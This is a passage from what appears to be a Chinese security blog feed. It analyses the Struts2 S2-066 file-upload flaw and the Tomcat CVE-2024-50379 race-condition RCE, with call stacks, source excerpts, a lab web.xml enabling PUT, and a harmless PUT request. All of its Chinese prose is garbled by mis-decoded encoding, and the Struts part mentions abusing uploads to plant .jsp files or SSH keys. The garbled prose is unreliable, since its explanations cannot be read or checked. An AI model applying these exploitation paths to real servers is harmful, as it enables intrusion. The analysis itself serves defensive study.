<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Parameter</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                newStack.setParameter(name, value.getObject());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (devMode) &#123;</span><br><span class="line">                    notifyDeveloperParameterException(action, name, e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>è€Œè¿™ä¸ª <code>newStack.setParameter</code>æœ€ç»ˆä¼šå¯¼è‡´<code>Action</code>çš„å±æ€§setterçš„è°ƒç”¨ã€‚<br>é‚£ä¹ˆå‚æ•°åˆ°æ–¹æ³•åçš„è½¬åŒ–æ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Œæˆ‘ä»¬ç›´æ¥åˆ°å…³é”®çš„åœ°æ–¹ï¼Œä¸‹é¢ç»™å‡ºä»<code>setParameters</code>æ–¹æ³•åˆ°<code>getDeclaredMethods</code>ä¹‹é—´çš„è°ƒç”¨å †æ ˆã€‚  </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">getDeclaredMethods:2680, OgnlRuntime (ognl)</span><br><span class="line">_getSetMethod:2912, OgnlRuntime (ognl)</span><br><span class="line">getSetMethod:2881, OgnlRuntime (ognl)</span><br><span class="line">hasSetMethod:2952, OgnlRuntime (ognl)</span><br><span class="line">hasSetProperty:2970, OgnlRuntime (ognl)</span><br><span class="line">setProperty:83, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)</span><br><span class="line">setProperty:3356, OgnlRuntime (ognl)</span><br><span class="line">setValueBody:134, ASTProperty (ognl)</span><br><span class="line">evaluateSetValueBody:220, SimpleNode (ognl)</span><br><span class="line">setValue:308, SimpleNode (ognl)</span><br><span class="line">setValue:780, Ognl (ognl)</span><br><span class="line">execute:436, OgnlUtil$1 (com.opensymphony.xwork2.ognl)</span><br><span class="line">execute:428, OgnlUtil$1 (com.opensymphony.xwork2.ognl)</span><br><span class="line">compileAndExecute:523, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:428, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">trySetValue:186, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:173, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameter:157, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameters:214, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br></pre></td></tr></table></figure>
<p>OgnlRuntime#getDeclaredMethods  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List <span class="title function_">getDeclaredMethods</span><span class="params">(Class targetClass, String propertyName, <span class="type">boolean</span> findSets)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ClassCache</span> <span class="variable">cache</span> <span class="operator">=</span> _declaredMethods[findSets ? <span class="number">0</span> : <span class="number">1</span>];</span><br><span class="line">        <span class="type">Map</span> <span class="variable">propertyCache</span> <span class="operator">=</span> (Map)cache.get(targetClass);</span><br><span class="line">        <span class="keyword">if</span> (propertyCache == <span class="literal">null</span> || (result = (List)propertyCache.get(propertyName)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(cache) &#123;</span><br><span class="line">                <span class="type">Map</span> <span class="variable">propertyCache</span> <span class="operator">=</span> (Map)cache.get(targetClass);</span><br><span class="line">                <span class="keyword">if</span> (propertyCache == <span class="literal">null</span> || (result = (List)((Map)propertyCache).get(propertyName)) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">baseName</span> <span class="operator">=</span> capitalizeBeanPropertyName(propertyName);</span><br><span class="line">                    <span class="type">List</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                    collectAccessors(targetClass, baseName, result, findSets);</span><br><span class="line">                    <span class="keyword">if</span> (propertyCache == <span class="literal">null</span>) &#123;</span><br><span class="line">                        cache.put(targetClass, propertyCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">101</span>));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ((Map)propertyCache).put(propertyName, result.isEmpty() ? NotFoundList : result);</span><br><span class="line">                    <span class="keyword">return</span> result.isEmpty() ? <span class="literal">null</span> : result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result == NotFoundList ? <span class="literal">null</span> : result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>capitalizeBeanPropertyName æ–¹æ³•ä¼šå¯¹å±æ€§åè¿›è¡Œå¤„ç†ï¼Œå¦‚<code>uploadFileName</code>ä¼šè¢«å¤„ç†ä¸º<code>UploadFileName</code><br><img src="/archives/fe8a0a5d/img_7.png" alt="img_7.png"><br>ç„¶åè°ƒç”¨ <code>collectAccessors</code> æŸ¥æ‰¾å¯¹åº”çš„æ–¹æ³•æ·»åŠ åˆ°<code>result</code>ä¸­ã€‚<br><img src="/archives/fe8a0a5d/img_8.png" alt="img_8.png"><br>æœ€ç»ˆåœ¨<code>ognl.OgnlRuntime.invokeMethodInsideSandbox</code>æ–¹æ³•ä¸­å®Œæˆ<code>Action</code>å±æ€§çš„è®¾ç½®ã€‚<br><img src="/archives/fe8a0a5d/img_9.png" alt="img_9.png"><br>è¿™æ ·ä¾¿å®Œæˆäº†<code>UploadAction</code>çš„<code>uploadFileName</code>å±æ€§çš„è¦†ç›–ã€‚<br><img src="/archives/fe8a0a5d/img_10.png" alt="img_10.png"><br>å½“ç”¨æˆ·ç¨‹åºæœªå¯¹<code>uploadFileName</code>çš„å€¼è¿›è¡Œæ£€æŸ¥çš„æ—¶å€™å¯èƒ½ä¼šå¯¼è‡´å¯ä¸Šä¼ ä»»æ„æ–‡ä»¶åˆ°ä»»æ„ç›®å½•ï¼Œé€šè¿‡ä¸Šä¼ <code>.jsp</code>æ–‡ä»¶çš„æ–¹å¼ä¾¿æœ‰å¯èƒ½é€ æˆä»£ç æ‰§è¡Œæ¼æ´ï¼Œæˆ–è€…ä¸Šä¼ <code>ssh</code>å¯†é’¥ç­‰ã€‚  </p>
<h1 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h1><p>åœ¨<code>HTTPParameters</code>ä¸­æ·»åŠ <code>remove</code>æ–¹æ³•ä»¥åˆ é™¤é€šè¿‡è¡¨å•ä¸Šä¼ çš„å‚æ•°ã€‚<br><img src="/archives/fe8a0a5d/img_11.png" alt="img_11.png"><br><img src="/archives/fe8a0a5d/img_12.png" alt="img_12.png">   </p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul>
<li><a href="https://github.com/apache/struts/compare/STRUTS_6_3_0_1...STRUTS_6_3_0_2">ä»£ç diff</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>Apache Struts2</tag>
        <tag>S2-066</tag>
        <tag>ä»»æ„æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>CVE-2023-50164</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat æ¡ä»¶ç«äº‰å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2024-50379/CVE-2024-56337ï¼‰</title>
    <url>/archives/172295c.html</url>
    <content><![CDATA[<h1 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h1><p>è¯¥æ¼æ´æ˜¯ç”±äºTomcatåœ¨éªŒè¯æ–‡ä»¶è·¯å¾„æ—¶å­˜åœ¨ç¼ºé™·ï¼Œå¦‚æœreadonlyå‚æ•°è¢«è®¾ç½®ä¸ºfalseï¼ˆè¿™æ˜¯ä¸€ä¸ªéæ ‡å‡†é…ç½®ï¼‰ï¼Œå¹¶ä¸”æœåŠ¡å™¨å…è®¸é€šè¿‡PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶ï¼Œ<br>é‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥ä¸Šä¼ å«æœ‰æ¶æ„JSPä»£ç çš„æ–‡ä»¶ã€‚é€šè¿‡ä¸æ–­åœ°å‘é€è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œä½¿å¾—Tomcatè§£æå¹¶æ‰§è¡Œè¿™äº›æ¶æ„æ–‡ä»¶ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚  </p>
<h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt; 11.0.2<br>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt; 10.1.34<br>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt; 9.0.98   </p>
<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>è¯¥æ¼æ´åªåœ¨å¤§å°å†™ä¸æ•æ„Ÿçš„æ“ä½œç³»ç»Ÿä¸‹å‘ç”Ÿï¼Œæ•…æ‰€æœ‰æµ‹è¯•ç¯å¢ƒå‡åŸºäºWindowsç³»ç»Ÿã€‚<br>ä¸‹è½½ <code>Tomcat 9.0.97</code> ç‰ˆæœ¬ï¼Œè§£å‹å<a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.97/bin/">ä¸‹è½½åœ°å€</a><br>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„æºä»£ç <a href="https://github.com/apache/tomcat/releases/tag/9.0.97">ä¸‹è½½åœ°å€</a><br>é…ç½®ROOT APP ä¿®æ”¹<code>web.xml</code>æ–‡ä»¶ï¼Œè®¾ç½®<code>DefaultServlet</code>çš„<code>readonly</code>å±æ€§ä¸ºfalseï¼Œå³å¯¹é™æ€èµ„æºå¯åŠ¨PUTæ–¹æ³•ä»¥ä¸ºROOT APPæ·»åŠ é™æ€æ–‡ä»¶ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä¸‹é¢è¿™æ ·çš„è¯·æ±‚åœ¨ ROOT APPä¸­æ–°å¢ä¸€ä¸ªé™æ€æ–‡ä»¶ã€‚ </p>
<figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/test.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-subunit">&lt;html&gt;</span></span><br><span class="line"><span class="language-subunit">&lt;body&gt;</span></span><br><span class="line"><span class="language-subunit"><span class="keyword">test</span></span></span><br><span class="line"><span class="keyword"><span class="language-subunit"></span>&lt;body&gt;</span></span><br><span class="line"><span class="language-subunit">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·è¯·æ±‚ä½“ä¸­çš„å†…å®¹å°†è¢«å†™å…¥åˆ° ROOT APP çš„æ ¹ç›®å½•ä¸‹ã€‚</p>
<p>é€‰æ‹©è¾ƒä½ç‰ˆæœ¬çš„JDKå¯¹tomcatè¿›è¡Œå¯åŠ¨ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>8u202</code>ï¼Œå› ä¸ºè¾ƒé«˜ç‰ˆæœ¬çš„JDKè§„èŒƒåŒ–è·¯å¾„ç¼“å­˜é»˜è®¤æ˜¯ç¦ç”¨çš„ï¼Œè€Œè¯¥æ¼æ´éœ€è¦è¿™ä¸ªé€‰é¡¹å¼€å¯ã€‚<br>è¿›å…¥<code>Tomcat</code>æ ¹ç›®å½•çš„<code>/bin</code>ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨tomcatå¹¶å¯åŠ¨è°ƒè¯•  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">catalina.bat jpda start</span><br></pre></td></tr></table></figure>
<p>å¯åŠ¨åç¨‹åºé»˜è®¤ç›‘å¬åœ¨8000ç«¯å£<br>ä½¿ç”¨ideaæ‰“å¼€Tomcatæºä»£ç ï¼Œå¹¶é…ç½®è°ƒè¯•é€‰é¡¹ï¼Œè®¾ç½®è°ƒè¯•ç«¯å£ä¸º8000<br><img src="/archives/172295c/img.png" alt="img.png">  </p>
<h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p>è¿™é‡Œæˆ‘ç›´æ¥å…ˆä»‹ç»æ¼æ´æˆå› ï¼Œä»¥æ–¹ä¾¿æˆ‘å¯¹è¯¥æ¼æ´è¿›è¡Œè¯´æ˜ã€‚<br>å½“Tomcatçš„æŸä¸€ä¸ªAPPçš„å¯åŠ¨äº†é™æ€æ–‡ä»¶çš„å†™å…¥åŠŸèƒ½æ—¶ï¼ˆå³readonlyå‚æ•°è¢«è®¾ç½®ä¸ºfalseï¼‰ï¼Œæ­¤æ—¶æœåŠ¡å™¨å…è®¸é€šè¿‡PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡PUTæ–¹æ³•<br>æƒ³æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªåä¸º<code>test.JSP</code>çš„æ–‡ä»¶ï¼Œç„¶ååœ¨è¯¥æ–‡ä»¶æ²¡æœ‰æ­£å¼è½åœ°çš„æ—¶å€™ï¼Œé€šè¿‡GETè¯·æ±‚è®¿é—®<code>test.jsp</code>ï¼Œåœ¨ç‰¹æ®Šçš„æ—¶æœºä¸‹é™æ€èµ„æºæ–‡ä»¶<code>test.JSP</code>å°†è¢«ä½œä¸ºåŠ¨æ€<br>çš„<code>jsp</code>æ–‡ä»¶è§£æï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚<br>å€¼å¾—å…³æ³¨çš„ç‚¹æ—¶<code>test.JSP</code>æ˜¯è¢«ä½œä¸ºé™æ€èµ„æºæ–‡ä»¶ç”±<code>DefaultServlet</code>è¿›è¡Œè§£æå¤„ç†çš„ï¼Œè€Œ<code>test.jsp</code>åˆ™æ˜¯ä½œä¸ºåŠ¨æ€æ–‡ä»¶ç”±<code>JspServlet</code>è¿›è¡Œè§£æå¤„ç†çš„ï¼Œ<br>æˆ–è€…è¯´<code>JspServlet</code>åªå¤„ç†<code>.jsp</code>ä»¥åŠ<code>.jspx</code>ä½œä¸ºåç¼€çš„æ–‡ä»¶ï¼ˆJspServletæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼‰ï¼Œè€Œ<code>test.JSP</code>æˆ–è€…<code>test.Jsp</code>è¿™ç±»æ–‡ä»¶éƒ½è¢«è®¤ä¸ºæ˜¯é™æ€èµ„æºæ–‡ä»¶<br>ç”±<code>DefaultServlet</code>å¤„ç†ã€‚<br>å› ä¸ºæˆ‘ä»¬çš„payloadè®¿é—®çš„æ˜¯<code>test.jsp</code>ï¼Œè¯¥è¯·æ±‚æ˜¯ç”±<code>JspServlet</code>å¤„ç†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»<code>JspServlet</code>çš„<code>serviceJspFile</code>æ–¹æ³•å¼€å§‹ã€‚<br><code>jspUri</code>å³æˆ‘ä»¬ä¼ å…¥çš„<code>test.jsp</code>ï¼Œè¿™é‡Œè·Ÿè¿›åˆ°<code>getResource</code>æ–¹æ³•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">serviceJspFile</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                HttpServletResponse response, String jspUri,</span></span><br><span class="line"><span class="params">                                <span class="type">boolean</span> precompile)</span></span><br><span class="line">        <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JspServletWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> rctxt.getWrapper(jspUri);</span><br><span class="line">        <span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">                wrapper = rctxt.getWrapper(jspUri);</span><br><span class="line">                <span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Check if the requested JSP page exists, to avoid</span></span><br><span class="line">                    <span class="comment">// creating unnecessary directories and files.</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">null</span> == context.getResource(jspUri)) &#123;</span><br><span class="line">                        handleMissingResource(request, response, jspUri);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    wrapper = <span class="keyword">new</span> <span class="title class_">JspServletWrapper</span>(config, options, jspUri,</span><br><span class="line">                                                    rctxt);</span><br><span class="line">                    rctxt.addWrapper(jspUri,wrapper);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            wrapper.service(request, response, precompile);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe) &#123;</span><br><span class="line">            handleMissingResource(request, response, jspUri);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>getResource</code>æ–¹æ³•ä½äº<code>org.apache.catalina.core.ApplicationContext.getResource</code><br><code>validateResourcePath</code>æ–¹æ³•é¦–å…ˆæ£€æŸ¥<code>path</code>æ˜¯å¦ä»¥<code>/</code>å¼€å¤´ï¼Œå¦‚æœä»¥<code>/</code>å¼€å¤´åˆ™è¿”å›<code>path</code>ï¼Œå¦åˆ™è¿”å›<code>/</code>åŠ ä¸Š<code>path</code>ã€‚<br>ç„¶åè°ƒç”¨<code>StandRoot</code>çš„<code>getResource</code>æ–¹æ³•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> URL <span class="title function_">getResource</span><span class="params">(String path)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">validatedPath</span> <span class="operator">=</span> validateResourcePath(path, !GET_RESOURCE_REQUIRE_SLASH);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (validatedPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(sm.getString(<span class="string">&quot;applicationContext.requestDispatcher.iae&quot;</span>, path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebResourceRoot</span> <span class="variable">resources</span> <span class="operator">=</span> context.getResources();</span><br><span class="line">        <span class="keyword">if</span> (resources != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> resources.getResource(validatedPath).getURL();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœç¼“å­˜å…è®¸ç¼“å­˜åˆ™ä»ç¼“å­˜ä¸­æŸ¥æ‰¾æ–‡ä»¶å­èµ„æºã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebResource <span class="title function_">getResource</span><span class="params">(String path, <span class="type">boolean</span> validate, <span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (validate) &#123;</span><br><span class="line">            path = validate(path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isCachingAllowed()) &#123;</span><br><span class="line">            <span class="keyword">return</span> cache.getResource(path, useClassLoaderResources);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getResourceInternal(path, useClassLoaderResources);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>noCache</code>æ–¹æ³•ä¸­æŒ‡å®šäº†ä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶æ˜¯ä¸èƒ½ç¼“å­˜çš„ï¼Œå¦‚ï¼š.class .jar æˆ–è€… classesç›®å½•ä¸‹çš„æ–‡ä»¶ç­‰ã€‚<br>ç„¶åä»èµ„æºç¼“å­˜åˆ—è¡¨<code>resourceCache</code>ä¸­æ ¹æ®è¯·æ±‚çš„èµ„æºè·¯å¾„æŸ¥æ‰¾ç¼“å­˜èµ„æºï¼Œç¬¬ä¸€æ¬¡è®¿é—®æ—¶ä¼šè¿”å›<code>null</code>ï¼Œå³<code>cacheEntry</code>æ­¤æ—¶ä¸º<code>null</code>ã€‚<br>ç„¶ååˆ›å»ºä¸€ä¸ª <code>CachedResource</code>å¯¹è±¡èµ‹å€¼ç»™<code>cacheEntry</code>å¹¶è°ƒç”¨å…¶<code>validateResource</code>æ–¹æ³•ï¼Œè¿›å…¥è¯¥æ–¹æ³•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebResource <span class="title function_">getResource</span><span class="params">(String path, <span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (noCache(path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> root.getResourceInternal(path, useClassLoaderResources);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">CacheStrategy</span> <span class="variable">strategy</span> <span class="operator">=</span> getCacheStrategy(); <span class="comment">// é»˜è®¤ä¸ºç©º</span></span><br><span class="line">        <span class="keyword">if</span> (strategy != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strategy.noCache(path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.getResourceInternal(path, useClassLoaderResources);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lookupCount.increment();</span><br><span class="line"></span><br><span class="line">        <span class="type">CachedResource</span> <span class="variable">cacheEntry</span> <span class="operator">=</span> resourceCache.get(path); <span class="comment">// ä»èµ„æºç¼“å­˜åˆ—è¡¨ä¸­æ ¹æ®è¯·æ±‚çš„èµ„æºè·¯å¾„æŸ¥æ‰¾ç¼“å­˜èµ„æºï¼Œ</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cacheEntry != <span class="literal">null</span> &amp;&amp; !cacheEntry.validateResource(useClassLoaderResources)) &#123;</span><br><span class="line">            removeCacheEntry(path);</span><br><span class="line">            cacheEntry = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cacheEntry == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">objectMaxSizeBytes</span> <span class="operator">=</span> getObjectMaxSizeBytes();</span><br><span class="line">            <span class="type">CachedResource</span> <span class="variable">newCacheEntry</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">CachedResource</span>(<span class="built_in">this</span>, root, path, getTtl(), objectMaxSizeBytes, useClassLoaderResources);</span><br><span class="line"></span><br><span class="line">            cacheEntry = resourceCache.putIfAbsent(path, newCacheEntry);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cacheEntry == <span class="literal">null</span>) &#123;</span><br><span class="line">                cacheEntry = newCacheEntry;</span><br><span class="line">                cacheEntry.validateResource(useClassLoaderResources);</span><br><span class="line">                <span class="type">long</span> <span class="variable">delta</span> <span class="operator">=</span> cacheEntry.getSize();</span><br><span class="line">                <span class="type">long</span> <span class="variable">result</span> <span class="operator">=</span> size.addAndGet(delta);</span><br><span class="line">                <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;cache.sizeTracking.add&quot;</span>, Long.toString(delta), cacheEntry, path,</span><br><span class="line">                            Long.toString(result)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (size.get() &gt; maxSize) &#123;</span><br><span class="line">                    <span class="comment">// Process resources unordered for speed. Trades cache</span></span><br><span class="line">                    <span class="comment">// efficiency (younger entries may be evicted before older</span></span><br><span class="line">                    <span class="comment">// ones) for speed since this is on the critical path for</span></span><br><span class="line">                    <span class="comment">// request processing</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">targetSize</span> <span class="operator">=</span> maxSize * (<span class="number">100</span> - TARGET_FREE_PERCENT_GET) / <span class="number">100</span>;</span><br><span class="line">                    <span class="type">long</span> <span class="variable">newSize</span> <span class="operator">=</span> evict(targetSize, resourceCache.values().iterator());</span><br><span class="line">                    <span class="keyword">if</span> (newSize &gt; maxSize) &#123;</span><br><span class="line">                        <span class="comment">// Unable to create sufficient space for this resource</span></span><br><span class="line">                        <span class="comment">// Remove it from the cache</span></span><br><span class="line">                        removeCacheEntry(path);</span><br><span class="line">                        log.warn(sm.getString(<span class="string">&quot;cache.addFail&quot;</span>, path, root.getContext().getName()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Another thread added the entry to the cache</span></span><br><span class="line">                <span class="keyword">if</span> (cacheEntry.usesClassLoaderResources() != useClassLoaderResources) &#123;</span><br><span class="line">                    cacheEntry = newCacheEntry;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Make sure it is validated</span></span><br><span class="line">                cacheEntry.validateResource(useClassLoaderResources);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            hitCount.increment();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cacheEntry;</span><br><span class="line">    